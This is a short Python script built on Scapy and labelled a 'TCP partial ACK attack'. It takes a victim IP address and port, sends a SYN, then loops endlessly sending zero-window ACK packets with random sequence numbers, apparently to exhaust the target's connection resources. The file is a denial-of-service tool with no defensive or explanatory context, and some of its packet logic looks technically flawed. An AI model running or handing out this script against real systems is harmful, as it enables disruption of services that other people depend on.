from scapy.all import *
import argparse
import random

# Parse command-line arguments
parser = argparse.ArgumentParser(description='TCP partial ACK attack')
parser.add_argument('victim', type=str, help='victim IP address')
parser.add_argument('port', type=int, help='victim port')
args = parser.parse_args()

# Generate list of random sequence numbers
seq_nums = [random.randint(0, 2**32-1) for i in range(1000)]

# Craft the initial SYN packet
ip = IP(dst=args.victim)
tcp_syn = TCP(sport=RandShort(), dport=args.port, flags="S", seq=random.choice(seq_nums))
syn_packet = ip / tcp_syn

# Send the initial SYN packet
send(syn_packet)

# Start sending partial ACK packets to keep the connection open
while True:
    # Choose a random sequence number from the list
    seq = random.choice(seq_nums)

    # Craft a partial ACK packet
    tcp_ack = TCP(sport=syn_packet[TCP].sport, dport=args.port, flags="A", seq=seq, ack=syn_packet[TCP].seq+1, window=0)
    ack_packet = ip / tcp_ack

    # Send the partial ACK packet
    send(ack_packet,timeout=3)

    # Wait a random amount of time before sending the next packet
    time.sleep(random.uniform(1, 10))
